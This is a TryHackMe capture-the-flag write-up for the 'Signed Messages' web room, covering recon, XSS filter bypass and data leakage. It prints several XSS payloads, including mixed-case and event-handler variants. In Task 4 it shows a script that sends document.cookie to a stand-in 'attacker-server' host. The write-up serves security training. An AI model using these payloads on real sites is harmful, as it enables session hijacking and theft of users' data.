# Signed Messages — TryHackMe Writeup

## Room Overview

Signed Messages is an intermediate web room centered on a message-based application. The goal
was to test user input handling, look for XSS, and see whether any sensitive data could be
leaked through weak filtering or unsafe rendering.

| Field | Info |
|-------|------|
| Target Type | Web Application |
| Attack Focus | XSS, data leakage, message manipulation |
| Tools Used | Browser, Burp Suite, DevTools, cURL |

---

## Task 1: Reconnaissance

### Objective
Understand the application and how messages are handled.

### What I Did
I opened the site in the browser and checked how messages were created and displayed. I also
looked at the page source and used DevTools to see if there were any obvious clues.

### Key Findings

- The app is message/note based.
- Users can create and view messages.
- The application likely includes some sort of signing or verification flow.

### Answer
**What type of application is this room focused on?**
> A message/note-based web application

---

## Task 2: Input Testing

### Objective
Check how the application handles user input.

### What I Did
I submitted simple text first, then tried basic HTML and script payloads to see whether the
input was escaped or rendered directly.

```xml
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Key Findings

- Some filtering was present.
- User input was not completely safe.
- The app could still be bypassed with variations.

### Answer
**What kind of issue was the room mainly testing?**
> XSS

---

## Task 3: Bypass Filters

### Objective
Find a payload that would execute.

### What I Did
I tried different payload styles, mixed-case tags, and event handlers.

```xml
<ScRiPt>alert(1)</sCrIpT>
<img src="x" onerror="alert(1)">
<body onload=alert(1)>
```

### Key Findings

- The filter was basic.
- Case changes and event handlers helped bypass it.
- The app did not sanitize input properly before rendering.

### Answer
**What helped bypass the filters?**
> Payload variation and event-handler based XSS

---

## Task 4: Data Leakage

### Objective
See whether XSS could be used to expose sensitive data.

### What I Did
After getting a working payload, I checked whether cookies or private data could be accessed
from the browser context.

```javascript
<script>
  document.location='http://attacker-server/?c='+document.cookie
</script>
```

I also checked whether message IDs or user parameters could expose other users' information.

### Key Findings

- Sensitive data could be exposed through browser-side execution.
- The app likely had weak protection around private messages or session data.

### Answer
**What else was tested besides XSS?**
> Data leakage

---

## Task 5: Exploitation

### Objective
Use the working payload to get access to sensitive information.

### What I Did
I created a malicious message and used it to trigger the vulnerable behavior. Burp Suite helped
me understand how the data moved through the app.

### Key Findings

- The app could be abused through a stored or reflected XSS vector.
- The payload exposed information that should not have been accessible.

### Answer
**What was the main exploitation technique?**
> Stored/reflected XSS leading to data leakage

---

## Task 6: Flag Retrieval

### Objective
Obtain the final flag.

### What I Did
Once the vulnerability was exploited, the exposed data led me to the flag.

### Answer
**What is the flag format used in the room?**
> `THM{...}`

---

## Tools & Techniques Summary

| Task | Tool | Purpose |
|------|------|---------|
| Recon | Browser / DevTools | Inspect app behavior |
| Request Analysis | Burp Suite | Intercept traffic |
| XSS Testing | Browser | Test payloads |
| Endpoint Testing | cURL | Direct requests |
